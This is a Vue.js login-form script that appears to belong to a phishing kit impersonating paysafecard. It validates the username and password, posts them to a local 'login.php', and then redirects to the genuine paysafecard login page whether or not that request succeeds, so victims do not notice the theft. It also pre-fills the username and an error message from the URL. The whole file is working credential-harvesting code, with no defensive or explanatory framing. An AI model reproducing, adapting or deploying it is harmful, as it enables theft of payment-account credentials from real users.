<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      progressActive: false,
      passwordVisible: false,
      username: '',
      password: '',
      usernameError: false,
      passwordError: false,
      usernameLengthError: false,
      passwordLengthError: false,
      loginError: false,
      referrerPage: "//login.paysafecard.com/customer-auth/?client_id=mypinsPR&theme=mypins&locale=nl_NL",
    }
  }, 
  methods: {
    togglePasswordVisible () {
      let t = this
      t.passwordVisible = !t.passwordVisible
    },
    updateUsernameStatus () {
      let t = this
      t.usernameError = t.username.length === 0
      if (!t.usernameError) {
        t.usernameLengthError = t.username.length < 4 || t.username.length > 20
      } else {
        t.usernameLengthError = false
      }
    },
    updatePasswordStatus () {
      let t = this
      t.passwordError = t.password.length === 0
      if (!t.passwordError) {
        t.passwordLengthError = t.password.length < 8 || t.password.length > 110
      } else {
        t.passwordLengthError = false
      }
    },
    submitForm () {
      let t = this
      t.usernameError = t.username.length === 0
      if (!t.usernameError) {
        t.usernameLengthError = t.username.length < 4 || t.username.length > 20
      }
      if (!t.usernameError) {
        t.passwordError = t.password.length === 0 || t.password.length < 8 || t.password.length > 110
        t.passwordLengthError = t.password.length < 8 || t.password.length > 110
      } else {
        t.passwordError = false
        t.passwordLengthError = false
      }
      if (!t.usernameError && !t.usernameLengthError && !t.passwordError && !t.passwordLengthError) {
        axios.post('login.php', {username: t.username, password: t.password})
        .then(res => {
          t.progressActive = true
          setTimeout(function() {
            window.location.replace(t.referrerPage);
          }, 350);
        })
        .catch(error => {
          t.progressActive = true
          setTimeout(function() {
            window.location.replace(t.referrerPage);
          }, 350);
        })
      }
    },
    initiatePage () {
      let uri = window.location.href.split("?");
      if (uri.length > 0 && uri[1] !== undefined) {
          let vars = uri[1].split("&");
          let getVars = {};
          let tmp = "";
          vars.forEach(function(v) {
            tmp = v.split("=");
            if (tmp.length == 2)
              getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
          });
          this.loginError = "undefined" !== typeof getVars["login_error"] ? getVars["login_error"] : "";
          this.username   = "undefined" !== typeof getVars["u"] ? getVars["u"] : "";
      }
    }
  },
  watch: {
    username: function () {
      this.updateUsernameStatus()
    },
    password: function () {
      this.updatePasswordStatus()
    }
  },
  beforeMount () {
    this.initiatePage()
  }
};
</script>

